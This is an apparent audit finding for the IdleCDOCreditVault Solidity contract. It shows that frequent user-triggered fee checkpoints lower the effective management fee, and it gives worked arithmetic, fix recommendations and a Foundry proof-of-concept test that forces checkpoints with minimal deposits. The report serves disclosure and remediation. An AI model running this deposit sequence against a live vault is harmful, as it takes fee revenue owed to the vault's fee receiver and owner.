### Title
Management fee effective rate depends on unprivileged users’ checkpoint frequency - (contracts/IdleCDOCreditVault.sol)

### Summary
`IdleCDOCreditVault` calculates its annualized management fee linearly over the NAV remaining after excluding previously accrued `unclaimedFees`. An unprivileged depositor can force fee checkpoints with minimal deposits. Each checkpoint reduces the NAV used for the next fee calculation, so more frequent checkpoints produce a lower effective annual fee than a single year-end checkpoint. This makes the realized fee rate dependent on interaction frequency rather than only on elapsed time.

### Finding Description
`_accrueManagementFee` calculates the fee for the elapsed interval against `_managedContractValue()` and then adds it to `unclaimedFees`. Because `unclaimedFees` is excluded from subsequent `_managedContractValue()` results, the next fee interval uses a smaller base.

```solidity
function _accrueManagementFee() internal {
  unclaimedFees += _calculateManagementFee(
    _managedContractValue(),
    block.timestamp - latestHarvestBlock
  );
  latestHarvestBlock = block.timestamp;
}
```

The fee calculation itself is linear:

```solidity
return _nav * managementFee * _duration / 3153600000000;
```

A checkpoint can be triggered by user calls that route through `_updateAccounting`, including normal deposits and applicable withdrawal requests. For example, `_deposit` calls `_updateAccounting` before processing the new deposit. Consequently, an attacker can repeatedly deposit a minimal amount to checkpoint fees on the existing vault NAV.

With NAV `N` and a 10% annual management fee:

- One checkpoint after one year: `N * 10% = 0.10N`.
- Checkpoints every six months:
  - first fee: `0.05N`
  - second fee: `(N - 0.05N) * 5% = 0.0475N`
  - total: `0.0975N`

The second case charges approximately `0.0025N` less, or 25 bps of NAV per year at a 10% management fee.

### Impact Explanation
The vault’s stated annualized management fee is not enforced as a frequency-independent rate. An attacker holding a small amount of tranche tokens or sharing pro rata with other LPs can force frequent checkpoints and reduce the management fees ultimately allocated to `feeReceiver` and `owner`.

At the maximum configured management fee, the discrepancy is approximately:

```text
NAV * 10% * 10% / 4 = NAV * 0.25%
```

For example, approximately 2,500 units per year on 1,000,000 units of NAV. The effect repeats whenever fee-bearing NAV remains live and user-triggered accounting checkpoints are available.

### Likelihood Explanation
The attacker only needs permission to make deposits or another user-level call that reaches `_updateAccounting`. If KYC is configured, the attacker must be an allowed wallet; otherwise any EOA can execute the sequence. The cost is limited to repeated minimal deposits and transaction gas. No privileged role, borrower misbehavior, oracle manipulation, default, or donation is required.

The issue requires a nonzero `managementFee` and sufficient time between checkpoints. It is more pronounced at higher management-fee rates and larger NAVs.

### Recommendation
Calculate management fees in a checkpoint-frequency-independent manner. For example:

- accrue fees against a continuously compounded or fixed-period fee model;
- maintain a cumulative fee index;
- calculate fees from gross NAV before subtracting previously accrued `unclaimedFees`; or
- calculate each interval from the NAV as of the interval start and explicitly preserve the intended annualized rate.

Update `IdleCreditVaultImpliedPrice` and withdrawal previews to use the same accounting convention so displayed prices match settlement accounting.

### Proof of Concept
The following Foundry-style PoC compares one year-end checkpoint with two user-triggered six-month checkpoints. It assumes the vault already has NAV `N`, `managementFee` is set to 10%, deposits are permitted, and `attacker` is wallet-allowed.

```solidity
function testManagementFeeDependsOnCheckpointFrequency() external {
    uint256 nav = IERC20Detailed(strategyToken).balanceOf(address(cdoEpoch));

    uint256 snapshot = vm.snapshot();

    // Baseline: no intermediate checkpoint. Checkpoint once after 365 days.
    vm.warp(block.timestamp + 365 days);
    vm.prank(owner);
    cdoEpoch.updateAccounting();

    uint256 singleCheckpointFees = cdoEpoch.unclaimedFees();
    uint256 expectedSingle = nav * 10_000 * 365 days / (FULL_ALLOC * 365 days);
    assertEq(singleCheckpointFees, expectedSingle);

    vm.revertTo(snapshot);

    // Attack: force checkpoints with economically insignificant deposits.
    vm.startPrank(attacker);
    IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), type(uint256).max);

    vm.warp(block.timestamp + 182.5 days);
    cdoEpoch.depositAA(ONE_SCALE);

    vm.warp(block.timestamp + 182.5 days);
    cdoEpoch.depositAA(ONE_SCALE);
    vm.stopPrank();

    uint256 frequentCheckpointFees = cdoEpoch.unclaimedFees();

    assertLt(
        frequentCheckpointFees,
        singleCheckpointFees,
        "frequent checkpoints reduce the effective annual fee"
    );

    // Approximately NAV * 10% * 10% / 4 = NAV * 0.25%.
    assertApproxEqRel(
        singleCheckpointFees - frequentCheckpointFees,
        nav / 400,
        0.01e18,
        "fee shortfall should be about 25 bps of NAV"
    );
}
```

The numerical formula can also be verified directly: `0.05N + 0.05(N - 0.05N) = 0.0975N`, while a single annual checkpoint yields `0.10N`.
